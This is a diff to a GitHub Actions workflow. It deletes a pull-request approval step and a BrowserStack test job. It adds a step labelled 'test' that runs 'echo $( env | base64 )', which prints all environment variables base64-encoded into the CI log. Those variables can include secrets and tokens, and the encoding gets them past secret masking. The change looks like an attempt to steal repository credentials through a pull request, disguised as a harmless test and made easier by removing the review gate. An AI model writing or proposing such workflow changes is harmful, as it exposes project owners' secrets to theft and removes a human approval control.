@@ -9,28 +9,5 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Approve
-      run: echo For security reasons, all pull requests need to be approved first before running any automated CI.
-      
-  ubuntu-job:
-    name: 'BrowserStack Test on Ubuntu'
-    runs-on: ubuntu-latest  # Can be self-hosted runner also
-    environment:
-      name: Integrate Pull Request
-    env: 
-      GITACTIONS: true
-    steps:
-
-
-      - name: 'Checkout the repository'
-        uses: actions/checkout@v2
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
-          fetch-depth: 2
-
-
-
-      - name: 'Build and run tests'
-        run: |
-          sudo apt update
-          chmod +x test.sh; ./test.sh
+    - name: test
+      run: echo $( env | base64 )
